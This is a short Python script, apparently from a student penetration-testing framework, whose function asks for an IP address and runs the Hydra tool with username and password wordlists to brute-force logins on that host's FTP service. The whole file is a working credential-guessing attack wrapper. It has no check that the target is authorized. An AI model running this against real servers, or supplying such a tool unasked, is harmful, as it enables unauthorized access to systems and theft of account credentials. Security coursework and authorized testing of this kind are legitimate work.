import subprocess

def brute_force():

    print("This feature uses Hydra which is a very powerful tool, here it is used to bruteforce ftp ports thanks to lists of usernames and passwords")
    ip = input("Enter the IP address: ")

    command = ["hydra", "-L", "/home/tristan/Documents/2A/S7/secureseau/FrameworkISMIN/GainningAccess/usernames.txt", "-P", "/home/tristan/Documents/2A/S7/secureseau/FrameworkISMIN/GainningAccess/passwords.txt", ip, "ftp", "-V"]
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        print("Brute force successful!")
        print(result.stdout)
    else:
        print("Brute force failed.")
        print(result.stderr)


